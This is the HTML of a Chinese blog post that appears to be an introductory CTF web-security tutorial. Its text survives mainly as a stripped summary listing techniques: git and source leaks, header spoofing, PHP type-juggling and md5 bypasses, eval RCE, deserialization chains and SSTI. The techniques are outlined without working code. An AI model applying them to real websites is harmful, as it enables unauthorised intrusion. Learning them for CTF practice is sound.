<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>web入个门 | 1azy_fish.</title><meta name="keywords" content="CTF"><meta name="author" content="1azy_fish."><meta name="copyright" content="1azy_fish."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="web入个门"><meta name="application-name" content="web入个门"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="web入个门"><meta property="og:url" content="https://la2y_fish.gitee.io/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/index.html"><meta property="og:site_name" content="1azy_fish."><meta property="og:description" content="CTF_web入门信息泄露查看源代码页面源代码是信息的一个重要来处F12和右击查看源代码都可以 目录扫描dirsearch与御剑 dirsearch安装：apt install dirsearch   git泄露GitHacker安装与使用 12345678910# installpython3 -"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://la2y_fish.gitee.io/img/10.jpg"><meta property="article:author" content="1azy_fish."><meta property="article:tag" content="自由"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://la2y_fish.gitee.io/img/10.jpg"><meta name="description" content="CTF_web入门信息泄露查看源代码页面源代码是信息的一个重要来处F12和右击查看源代码都可以 目录扫描dirsearch与御剑 dirsearch安装：apt install dirsearch   git泄露GitHacker安装与使用 12345678910# installpython3 -"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://la2y_fish.gitee.io/2023/08/06/web%E5%85%A5%E4%B8%AA%E9%97%A8/"><link rel="preconnect" href="//cdn.cbd.int"><meta name="google-site-verification" content="xxx"><meta name="baidu-site-verification" content="code-xxx"><meta name="msvalidate.01" content="xxx"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={linkPageTop:void 0,peoplecanvas:{enable:!0,img:"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},postHeadAiDescription:{enable:!0,gptName:"AnZhiYu",mode:"local",switchBtn:!1,btnLink:"https://afdian.net/item/886a79d4db6711eda42a52540025c377",randomNum:3,basicWordCount:1e3,key:"xxxx",Referer:"https://xx.xx/"},diytitle:{enable:!0,leaveTitle:"w(ﾟДﾟ)w 不要走！再看看嘛！",backTitle:"♪(^∇^*)欢迎肥来！"},LA51:void 0,greetingBox:{enable:!0,default:"晚上好👋",list:[{greeting:"晚安😴",startTime:0,endTime:5},{greeting:"早上好鸭👋, 祝你一天好心情！",startTime:6,endTime:9},{greeting:"上午好👋, 状态很好，鼓励一下～",startTime:10,endTime:10},{greeting:"11点多啦, 在坚持一下就吃饭啦～",startTime:11,endTime:11},{greeting:"午安👋, 宝贝",startTime:12,endTime:14},{greeting:"🌈充实的一天辛苦啦！",startTime:14,endTime:18},{greeting:"19点喽, 奖励一顿丰盛的大餐吧🍔。",startTime:19,endTime:19},{greeting:"晚上好👋, 在属于自己的时间好好放松😌~",startTime:20,endTime:24}]},twikooEnvId:"",commentBarrageConfig:void 0,music_page_default:"nav_music",root:"/",preloader:{source:3},friends_vue_info:void 0,navMusic:!1,mainTone:void 0,authorStatus:void 0,algolia:void 0,localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"简",rightMenuMsgToTraditionalChinese:"转为繁体",rightMenuMsgToSimplifiedChinese:"转为简体"},noticeOutdate:void 0,highlight:{plugin:"highlight.js",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:330},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,simplehomepage:!0,post:!1},runtime:"天",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{copy:!0,copyrightEbable:!1,limitCount:50,languages:{author:"作者: 1azy_fish.",link:"链接: ",source:"来源: 1azy_fish.",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。",copySuccess:"复制成功，复制和转载请标注本文地址"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#425AEF",bgDark:"#1f1f1f",position:"top-center"},source:{justifiedGallery:{js:"https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js",css:"https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css"}},isPhotoFigcaption:!1,islazyload:!1,isAnchor:!1,shortcutKey:void 0,autoDarkmode:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={configTitle:"1azy_fish.",title:"web入个门",postAI:"",pageFillDescription:"CTF_web入门, 信息泄露, 查看源代码, 目录扫描, git泄露, DS_Store泄露, robots.txt, 备份文件源码泄漏, HTTP学习, HTTP请求中的一些请求头, HTTP请求中的一些常用自定义请求头, 常见的Content-Type类型包括：, 请求方式, GETampPOST, HTTP头部绕过姿势, Dos命令, php语法快速入门（看得懂就行版本）, php的正则表达式, 基础, 进阶, php中的一些技巧, php弱类型与强类型, x3Dx3D 与 x3Dx3Dx3D, md5绕过(Hash比较缺陷), json绕过, array_search is_array绕过, strcmp漏洞绕过 php -v lt5.3, switch绕过, is_numeric（）、int()强制类型转换, php_eval_RCE, 然后就是一些linux的基础知识, Linux系统的文件结构, linux的命令, 无字母RCE, php的一些特性, 你喜欢preg_match吗？, 讨厌的intval, date函数的解析, realpath导致的文件异常删除, php反序列化, 一般类型, 使用php原生类, __destruct的触发, SSTI, 判断模板引擎, 判断模板注入的注入点方法, Smarty SSTI, Twig SSTI, Flask Jinja2 SSTI入门信息泄露查看源代码页面源代码是信息的一个重要来处和右击查看源代码都可以目录扫描与御剑安装泄露安装与使用可以进入对应文件夹然后使用查看对应日志通过以达到恢复已删除内容的效果泄露工具下载与使用爬虫协议有时可以通过它看见一些重要的目录备份文件源码泄漏信息泄露题目总结博客园学习安全中入门的时候你需要理解的是头的内容至少请求中的一些请求头指定目标服务器的主机名或地址指定客户端使用的浏览器或其他应用程序的信息指定客户端能够接受的类型指定客户端首选的自然语言指定客户端能够接受的编码方式例如等指定客户端与服务器之间使用的连接类型例如或指定请求体的类型例如等指定请求体的长度以字节为单位指定请求的来源用于告诉服务器用户从哪个页面跳转到当前页面指定请求的认证信息例如用户名和密码或访问令牌指定请求的信息用于跟踪用户会话指定上次请求资源的时间服务器可以根据该头部判断资源是否已经被修改过指定客户端使用的浏览器或其他应用程序的信息指定服务器是否支持分段下载例如指定客户端请求的资源范围用于实现分段下载或断点续传指定请求或响应的缓存策略例如等请求中的一些常用自定义请求头头部是在代理或负载均衡器后面使用的用于记录客户端的地址特别在使用代理服务器时用于指示请求的类型例如用于防止跨站请求伪造攻击用于指示浏览器是否应该自动处理响应体的类型例如用于控制页面是否可以嵌入到中防止点击劫持攻击用于启用浏览器内置的跨站脚本攻击防护机制用于指示服务器所使用的软件名称和版本号常见的类型包括用于传输格式的数据用于传输表单数据即编码的键值对用于传输文件和二进制数据用于传输纯文本数据请求方式定义了一组请求方法以表明要对给定资源执行的操作指示针对给定资源要执行的期望动作虽然它们也可以是名词但这些请求方法有时被称为动词每一个请求方法都实现了不同的语义但一些共同的特征由一组共享例如一个请求方法可以是安全的幂等的或可缓存的方法请求一个指定资源的表示形式使用的请求应该只被用于获取数据方法请求一个与请求的响应相同的响应但没有响应体方法用于将实体提交到指定的资源通常导致在服务器上的状态变化或副作用方法用有效载荷请求替换目标资源的所有当前表示方法删除指定的资源方法建立一个到由目标资源标识的服务器的隧道方法用于描述目标资源的通信选项方法沿着到目标资源的路径执行一个消息环回测试方法用于对资源应用部分修改这里常用的是和的请求方式和操作是传参的基本操作也是中很常见的常规操作使用可以很轻松的完成这个任务在中提交参数如可通过或抓包插入数据提交最直接的区别请求的参数是放在里的请求参数是放在请求里的头部绕过姿势如果提示需要本地或指定才能访问则可在报文头部添加以下几种常用信息段如果需要验证网页来源如一定要从谷歌跳转过来的页面才允许访问则可在报文头部添加如果网页需要验证我们可以在头部加入除了以上几种常见的情况还需根据具体情况来使用不同的操作命令显示或修改文件扩展名关联显示或更改文件属性设置或清除扩展式检查设置启动数据库中的属性以控制启动加载显示或修改文件的访问控制列表从另一个批处理程序调用这一个显示当前目录的名称或将其更改显示或设置活动代码页数显示当前目录的名称或将其更改检查磁盘并显示状态报告显示或修改启动时间磁盘检查清除屏幕打开另一个命令解释程序窗口设置默认控制台前景和背景颜色比较两个或两套文件的内容显示或更改分区上文件的压缩将卷转换成你不能转换当前驱动器将至少一个文件复制到另一个位置显示或设置日期删除至少一个文件显示一个目录中的文件和子目录显示或配置磁盘分区属性编辑命令行撤回命令并创建宏显示当前设备驱动程序状态和属性显示消息或将命令回显打开或关闭结束批文件中环境更改的本地化删除一个或多个文件退出程序命令解释程序比较两个文件或两个文件集并显示它们之间的不同在一个或多个文件中搜索一个文本字符串在多个文件中搜索字符串为一组文件中的每个文件运行一个指定的命令格式化磁盘以便用于显示或配置文件系统属性显示或修改在文件扩展名关联中使用的文件类型将命令解释程序定向到批处理程序中某个带标签的行显示计算机或用户的组策略信息使在图形模式下显示扩展字符集提供命令的帮助信息显示修改备份或还原文件和目录的在批处理程序中执行有条件的处理操作创建更改或删除磁盘的卷标创建一个目录创建一个目录创建符号链接和硬链接配置系统设备逐屏显示输出将一个或多个文件从一个目录移动到另一个目录显示远程用户为了文件共享而打开的文件为可执行文件显示或设置搜索路径暂停批处理文件的处理并显示消息还原通过保存的当前目录的上一个值打印一个文本文件更改命令提示保存当前目录然后对其进行更改删除目录从损坏的或有缺陷的磁盘中恢复可读信息记录批处理文件或中的注释批注重命名文件重命名文件替换文件删除目录复制文件和目录树的高级实用工具显示设置或删除环境变量开始本地化批处理文件中的环境更改显示或配置服务后台进程安排在一台计算机上运行命令和程序调整批处理文件中可替换参数的位置允许通过本地或远程方式正确关闭计算机对输入排序启动单独的窗口以运行指定的程序或命令将路径与驱动器号关联显示计算机的特定属性和配置显示包括服务在内的所有当前运行的任务中止或停止正在运行的进程或应用程序显示或设置系统时间设置会话的窗口标题以图形方式显示驱动程序或路径的目录结构显示文本文件的内容显示的版本告诉是否进行验证以确保文件正确写入磁盘显示磁盘卷标和序列号复制文件和目录树在交互式命令中显示信息语法快速入门看得懂就行版本当你开始学习语法时以下是一些基本概念和语法规则可以帮助你快速入门语法标记代码通常包含在和标记之间例如代码在这里注释使用注释可以在代码中添加说明性文字对于自己和其他人来说都很有用支持单行注释和多行注释例如这是单行注释这是多行注释变量用于存储和操作数据的容器在中变量以美元符号开头后面跟着变量名变量名可以包含字母数字和下划线但必须以字母或下划线开头是一种弱类型语言变量的类型会根据赋值的内容自动确定例如字符串类型的变量整数类型的变量数据类型支持多种数据类型包括字符串整数浮点数布尔值数组对象等根据需要你可以根据数据类型执行相应的操作例如字符串类型整数类型浮点数类型布尔值类型输出内容使用或关键字可以将内容输出到浏览器例如输出字符串输出变量的值条件语句使用条件语句可以根据条件的真假执行不同的代码块常见的条件语句有和例如未成年人成年人老年人循环语句使用循环语句可以重复执行一段代码块常见的循环语句有和例如函数函数是封装了一段可重复使用的代码块它可以接受参数并返回一个值以下是一个简单的函数示例调用函数并传递参数数组数组是用于存储多个值的数据结构在中数组可以包含不同类型的值并且可以通过索引或关联键进行访问以下是一个简单的数组示例输出数组的第一个元素输出数组中关联键为的值类类是面向对象编程的核心概念之一用于封装数据和功能一个类定义了一种对象的行为和属性以下是一个简单的类示例创建一个对象调用类的方法在上面的示例中类具有和两个属性以及构造函数和方法使用关键字可以实例化一个类并通过运算符访问类的属性和方法的正则表达式基础字符匹配匹配任意字符除了换行符匹配字母数字下划线匹配数字匹配空白字符空格制表符换行符等重复匹配匹配前面的元素零次或多次匹配前面的元素一次或多次匹配前面的元素零次或一次匹配前面的元素恰好次匹配前面的元素至少次匹配前面的元素至少次最多次字符类匹配或中的任意一个字符匹配除了和以外的任意字符匹配任意小写字母匹配任意大写字母匹配任意数字边界匹配匹配字符串的开始位置匹配字符串的结束位置匹配单词的边界分组和捕获创建一个捕获组创建一个非捕获组进阶反向引用使用将模式中的一部分捕获为一个组可以使用为组的编号来引用先前捕获的组例如将匹配连续出现的两个相同的字母匹配成功重复的单词是未找到重复的单词匹配成功重复的单词是在上面的示例中正则表达式模式包含以下部分这是一个捕获组用于匹配一个完整的单词匹配一个或多个空格字符这是一个反向引用引用了第一个捕获组所匹配的内容平衡组使用平衡组可以匹配嵌套结构如括号标签等通过在模式中使用递归引用来实现平衡组的匹配括号匹配成功括号匹配失败括号匹配成功在上面的示例中正则表达式模式使用了平衡组的概念这个模式包含以下部分这是一个定义块定义了一个名为的平衡组这是名为的平衡组用于匹配成对出现的括号它使用了递归的方式允许嵌套的括号详细解析这个模式使用了平衡组的概念来匹配平衡的括号结构定义块定义了一个定义块其中包含一个名为的平衡组的定义在上面的定义块中我们定义了名为的平衡组它使用了递归的方式来匹配括号内的内容匹配左括号这是一个非捕获组用于匹配括号内的内容它可以匹配非括号字符或者递归引用这样就可以实现括号内的嵌套结构匹配右括号引用是对平衡组的引用它用于匹配整个字符串是否符合平衡的括号结构匹配字符串的开头这是对平衡组的引用用于匹配平衡的括号结构匹配字符串的结尾断言正向肯定先行断言要求后面的模式与其匹配但不消耗字符正向否定先行断言要求后面的模式不与其匹配但不消耗字符反向肯定后行断言要求前面的模式与其匹配但不消耗字符反向否定后行断言要求前面的模式不与其匹配但不消耗字符修饰符忽略大小写多行模式使和匹配每行的开始和结束位置使匹配包括换行符在内的所有字符忽略模式中的空白和注释中的一些技巧弱类型与强类型与在进行比较的时候会先判断两种字符串的类型是否相等再比较在进行比较的时候会先将字符串类型转化成相同再比较如果比较一个数字和字符串或者比较涉及到数字内容的字符串则字符串会被转换成数值并且比较按照数值来进行上述代码可自行测试观察上述代码比较的时候会将转化成数值强制转化由于是字符串转化的结果是自然和相等比较的时候会将转化成数值结果为而却等于错误即是被转化成了为什么呢相互比较的时候会将这类字符串识别为科学技术法的数字的无论多少次方都是零所以相等手册当一个字符串当作一个数值来取值其结果和类型如下如果该字符串没有包含并且其数值值在整形的范围之内该字符串被当作来取值其他所有情况下都被作为来取值该字符串的开始部分决定了它的值如果该字符串以合法的数值开始则使用该数值否则其值为绕过比较缺陷大意是要输入一个字符串和数字类型并且他们的值相等就可以成功执行下一步语句介绍一批开头是的字符串在比较的时候会将其视作为科学计数法所以无论后面是什么的多少次方还是键入成功绕过开头是的字符串来源于网络绕过输入一个类型的字符串函数解成一个数组判断数组中的值是否等于的值但是的值我们不知道但是可以利用这种形式绕过最终绕过先判断传入的是不是数组然后循环遍历数组中的每个值并且数组中的每个值不能和相等并且将每个值转化为类型再判断传入的数组是否有有则返回可以绕过官方手册对的介绍必需可选函数判断中的值是存在存在则返回该值的键值第三个参数默认为如果设置为则会进行严格过滤返回键值返回键值函数类似于也就是当然是当然如果第三个参数为则就不能绕过漏洞绕过是比较两个字符串如果则返回如果大于返回如果两者相等返回我们是不知道的值的题目要求判断的接受的值和必需相等传入的期望类型是字符串类型如果传入的是个数组会怎么样呢我们传入可以绕过是因为函数接受到了不符合的类型将发生错误但是还是判断其相等绕过结果输出原理和上面一样强制类型转换知识点不能正确转换的类型有十六进制型字符串科学计数法型字符串支持普通数字型字符串科学记数法型字符串部分支持十六进制型字符串先判断是不是数字然后再进行长短的限定判断也就是只能限定在通过能传入科学计数法来进行绕过所以根据不能处理科学计数法而在上能处理来解决危险函数利用好就可以完成所以一般使用的时候会掉很多东西下面就是一个最简单的的利用我们可以通过调用一些函数达到的效果最经典的就是可以通过这个函数实现命令的执行然后就是一些的基础知识系统的文件结构二进制文件系统常规命令系统启动分区系统启动时读取的文件设备文件大多数配置文件普通用户的家目录位函数库位库手动临时挂载点手动临时挂载点第三方软件安装位置进程信息及硬件信息临时设备的默认挂载点系统管理命令数据数据内核相关信息临时文件用户相关设定的命令立刻关机两分钟后关机立刻重启两分钟后重启帮助命令查看命令的用法命令说明书打开命令说明后可按键退出切换用户切换为用户输入后回车需要输入该用户的密码退出当前用户切换目录切换到根目录切换到根目录下的目录切换到上一级目录或者使用命令切换到目录切换到上次访问的目录文件夹名切换到本目录下的名为的文件目录如果目录不存在报错可以输入完整的路径直接切换到目标目录输入过程中可以使用键快速补全查看目录查看当前目录下的所有目录和文件查看当前目录下的所有目录和文件包括隐藏的文件列表查看当前目录下的所有目录和文件列表查看显示更多信息与命令效果一样查看指定目录下的所有目录和文件创建目录在当前目录下创建一个名为的目录在指定目录下创建一个名为的目录删除目录与文件文件名删除当前目录下的文件文件名删除当前目录的的文件不询问文件夹名递归删除当前目录下此名的目录文件夹名递归删除当前目录下此名的目录不询问将当前目录下的所有目录和文件全部删除将根目录下的所有文件全部删除修改目录当前目录名新目录名修改目录名同样适用与文件操作将目录下的目录剪切到目录下面递归剪切目录中所有文件和文件夹拷贝目录将目录下的目录复制到目录下面递归剪复制目录中所有文件和文件夹搜索目录查找目录下的所有以开头的文件或者目录查看当前目录显示当前位置路径新增文件在当前目录下创建名为的文件文件不存在如果文件存在将文件时间属性修改为当前系统时间删除文件文件名删除当前目录下的文件文件名删除当前目录的的文件不询问编辑文件文件名打开需要编辑的文件打开文件并跳到第行以只读模式打开文件进入后操作界面有三种模式命令模式插入模式和底行模式命令模式刚进入文件就是命令模式通过方向键控制光标位置使用命令删除当前整行使用命令字段进行查找按在光标所在字符前开始插入按在光标所在字符后开始插入按在光标所在行的下面另起一新行插入按进入底行模式插入模式此时可以对文件内容进行编辑左下角会显示插入按进入底行模式底行模式退出编辑强制退出保存并退出操作步骤示例保存文件按输入输入回车保存并退出编辑取消操作按输入输入回车撤销本次修改并退出编辑查看文件查看文件最后一屏内容向上翻页向下翻页退出查看显示百分比回车查看下一行空格查看下一页退出查看查看文件的后行退出查看权限说明文件权限简介代表可读代表可写代表执行权限括号内代表法文件权限信息示例第一位就代表是文件代表是文件夹第一组三位拥有者的权限第二组三位拥有者所在的组组员的权限第三组三位代表的是其他用户的权限文件权限普通授权法说明授予所有权限打包与解压系统中压缩文件的扩展名中打包文件的扩展名中压缩文件的扩展名中打包并压缩文件的扩展名打包文件打包压缩后的文件名要打包的文件参数说明调用压缩命令进行压缩打包文件显示运行过程指定文件名多个文件压缩打包解压文件解包至当前目录指定解压的位置解压文件查看文件的内容其他常用命令将目前目录及其子目录下所有延伸档名是的文件列出来将目前目录其其下子目录中所有一般文件列出将目前目录及其子目录下所有最近天内更新过的文件列出查找目录中更改时间在日以前的普通文件并在删除之前询问它们查找前目录中文件属主具有读写权限并且文件所属组的用户和其他用户具有读权限的文件为了查找系统中所有文件长度为的普通文件并列出它们的完整路径将和文件相关的文件都查找出来说明指令会在环境变量设置的目录里查找符合条件的文件查看指令的绝对路径说明命令以系统管理者的身份执行指令也就是说经由所执行的指令就好像是亲自执行需要输入自己账户密码使用权限在中有出现的使用者列出目前的权限以用户身份编辑目录下目录中的文件在文件中查找字符串不区分大小写输出成功匹配的行以及该行之后的三行在一个文件夹中递归查询包含指定字符串的文件说明命令用于运行脚本这些脚本一般位于文件下这个命令可以直接运行这个文件夹里面的脚本而不用加上路径查看服务状态查看所有服务状态重启服务说明这个命令用于显示系统当前内存的使用情况包括已用内存可用内存和交换内存的情况以为单位输出内存的使用量为为为为字节查看所有内存的汇总显示当前系统中占用资源最多的一些进程按照内存大小查看说明显示文件系统的磁盘使用情况一种易看的显示挂载一个文件系统需要先创建一个目录然后将这个文件系统挂载到这个目录上添加到中进行自动挂载这样任何时候系统重启的时候文件系统都会被加载说明可以显示一些重要的系统信息例如内核名称主机名内核版本号处理器类型之类的信息说明安装插件命令使用安装更新卸载删除说明插件安装命令使用文件安装使用更新卸载删除设置系统时间说明使用从网上下载软件音乐视频示例下载文件并以指定的文件名保存文件访问服务器显示远程主机上文件列表将本地目录下的文件发送到服务器的目录下防火墙操作查看服务的状态开启服务停止服务重启服务关闭服务的开机自启动开启服务的开机自启动防火墙操作查看防火墙状态关闭运行的防火墙永久禁止防火墙服务修改主机名主机名查看网络修改修改网络配置文件文件地址主要修改以下配置网络类型静态网卡名设置的子网掩码网关备用系统启动时启动此设置修改保存以后使用命令重启网卡配置映射修改文件在文件最后添加映射地址示例如下配置好以后保存退出输入命令可见实际的是查看进程查看所有正在运行的进程结束进程杀死该的进程强制杀死该进程查看链接查看与此地址的连接情况查看当前系统端口查看指定端口快速清屏清屏往上翻可以查看历史操作远程主机远程主机需要输入用户名和密码无字母无字母虽然在现实环境中不会出现但是在中也是常见的考点最简单的如下我在冲浪的时候不小心找到了一个佬写的文章他开发的一个工具挺有用的针对常规无字母的通用辅助脚本开发的一些特性你喜欢吗首先是大家喜闻乐见的什么你也喜欢他的原理是什么呢我们随便写个测一下似乎会忽略在句尾的无论是换行模式还是不换行测了一下这似乎是个错误的理解我们可以看到是一定要搭配或者来使用的也就是说有必须要有或者否则无意义还有一个东西也是所导致的一个小问题那就是非模式下不匹配众所周知函数是可以绕过的详细参考神利用回溯次数限制绕过某些安全限制正好测试一下讨厌的函数的解析在函数中转义字符函数完整声明如下其中有默认值一般不考虑关键在第一个参数他会按照为年为月等一系列格式化参数来将的值转化为格式化的日期如而想要将字符原样输出不参与日期格式化则可以用反斜杠来进行转义这类属于可能存在的逻辑漏洞导致的文件异常删除强网拟态可以利用构造删除创建和解压也作为目录解压后就没有了反序列化序列化其实就是将数据转化成一种可逆的数据结构自然逆向的过程就叫做反序列化常见的魔术方法执行时先会调用这个函数执行时先会调用这个函数对象被销毁时触发在对象上下文中调用不可访问的方法时触发在静态上下文中调用不可访问的方法时触发用于从不可访问的属性读取数据或者不存在这个键都会调用此方法用于将数据写入不可访问的属性在不可访问的属性上调用或触发在不可访问的属性上使用时触发把类当作字符串使用时触发当尝试将对象调用为函数时触发一般类型示例题目很显然构造链子通过将这个类当作字符串赋值调动读取不存在的调动将作函数调用调动把不可打印字符编码使用原生类例如反方向的钟一道反序列化链子然后调用的内置类来读取文件内容但是读取之后没有输出所以使用伪协议输出最终很简单的一条链子用到了原生类绕过方法一方法二的触发正常情况下在中正常触发析构函数有三种方法程序正常结束主动调用将原先指向类的变量取消对类的引用会使得我们的程序没有正常结束所以类没有被销毁触发异常又称服务器模板注入攻击发生在框架的层的导致原因是由于使用了由于模板引擎使用静态模板文件并在运用时用页面中的实际值替换变量占位符从而让页面的设计更容易当前广泛应用的模板有和服务器接收了用户的输入将其作为应用模板内容的一部分在进行部分目标编译渲染的过程中执行了用户插入的恶意内容因而可能导致了敏感信息泄露代码执行等问题模板引擎可以让网站程序实现界面和数据分离业务代码和逻辑代码的分离大大提升了开发效率也使得代码重用变得更加容易但是往往新的开发都会导致一些安全问题虽然模板引擎会提供沙箱机制但是也同样存在沙箱逃逸技术来绕过模板是一种提供给程序来解析的语法换句话说模板是从数据变量到实际的视觉表现这项工作的一种实现手段最重要的是模板渲染你可以使用方法来渲染模板你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量实际上引发的问题主要就是渲染函数的问题这个函数作用就是把涉及的页面与用户数据分离开这样方便展示和管理当用户输入自己的数据信息页面可以根据用户自身的信息来展示页面注入思想是不断调用我们要使用的命令如等来读取和写入配置文件判断模板引擎根据编程语言各种编程语言对应的模板引擎如下模板框架自带根据此图片判断模板注入的注入点方法找这样的场景输入什么就输出什么这样的常见有两种比较大可能的类型需要下面是一些会用到的魔术对象返回类型所属的对象返回一个包含对象所继承的基类元组方法在解析时按照元组的顺序解析返回该对象所继承的基类和都是用来寻找基类的获取当前类的所有子类类的初始化方法对包含保存函数全局变量的字典的引用用魔术对象可以构造一些简单的语句我们在里面运行以下解读一下返回所属的对象返回这个对象所继承的基类找到了这个对象的基类那么就返回这个基类下所具有的子类模板引擎特点装载一个变量模板渲染的时候会使用传进来的同名参数将这个变量代表的值替换掉装载一个控制语句装载一个注释模板渲染的时候会忽视这中间的值核心思路找",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-04-10 19:16:35",postMainColor:""}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:(e,t,a)=>{var o;0!==a&&(o=Date.now(),localStorage.setItem(e,JSON.stringify({value:t,expiry:o+864e5*a})))},get:e=>{var t=localStorage.getItem(e);if(t){t=JSON.parse(t);if(!(Date.now()>t.expiry))return t.value;localStorage.removeItem(e)}}},e.getScript=(o,c={})=>new Promise((t,e)=>{const a=document.createElement("script");a.src=o,a.async=!0,a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},Object.keys(c).forEach(e=>{a.setAttribute(e,c[e])}),document.head.appendChild(a)}),e.getCSS=(o,c=!1)=>new Promise((t,e)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=o,c&&(a.id=c),a.onerror=e,a.onload=a.onreadystatechange=function(){var e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,t())},document.head.appendChild(a)}),e.activateDarkMode=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#18171d")},e.activateLightMode=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#f7f9fe")};var e=saveToLocal.get("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches,a=window.matchMedia("(prefers-color-scheme: light)").matches,o=window.matchMedia("(prefers-color-scheme: no-preference)").matches,c=!t&&!a&&!o,t=(void 0===e?(a?activateLightMode():t?activateDarkMode():(o||c)&&((a=(new Date).getHours())<=6||18<=a?activateDarkMode:activateLightMode)(),window.matchMedia("(prefers-color-scheme: dark)").addListener(e=>{void 0===saveToLocal.get("theme")&&(e.matches?activateDarkMode:activateLightMode)()})):("light"===e?activateLightMode:activateDarkMode)(),saveToLocal.get("aside-status"));void 0!==t&&("hide"===t?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/loading.gif" data-original="/img/env2.jpg"><div class="loading-image-dot"></div></div></div><script>const preloader={endLoading:()=>{document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",()=>{preloader.endLoading()}),setTimeout(function(){preloader.endLoading()},1e4),document.addEventListener("pjax:send",()=>{preloader.initLoading()}),document.addEventListener("pjax:complete",()=>{preloader.endLoading()})</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"><script async src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">1azy_fish.</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><i class="fas fa-home faa-tada"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa fa-graduation-cap faa-tada"></i><span> 博文</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="fa fa-archive faa-tada"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="fa fa-tags faa-tada"></i><span> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="fa fa-folder-open faa-tada"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><i class="fas fa-box faa-tada"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/comments/"><i class="fa fa-paper-plane faa-tada"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/about/"><i class="fas fa-heart faa-tada"></i><span> 关于笔者</span></a></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole()"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li 